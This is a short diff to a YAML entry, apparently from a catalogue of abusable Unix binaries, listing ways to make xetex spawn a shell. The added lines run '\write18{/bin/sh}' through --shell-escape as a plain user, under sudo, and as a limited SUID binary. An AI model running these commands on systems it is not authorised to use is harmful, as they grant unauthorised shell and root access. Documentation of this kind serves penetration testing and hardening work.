@@ -1,5 +1,12 @@
+---
 functions:
+  shell:
+    - code: |
+        xetex --shell-escape '\write18{/bin/sh}\end'
   sudo:
     - code: |
-        echo "\documentclass[12pt]{article} \begin{document} \immediate\write18{/usr/bin/whoami} \end{document}" > file.tex
-        sudo xetex -interaction=nonstopmode -shell-escape file.tex
+        sudo xetex --shell-escape '\write18{/bin/sh}\end'
+  limited-suid:
+    - code: |
+        ./xetex --shell-escape '\write18{/bin/sh}\end'
+---
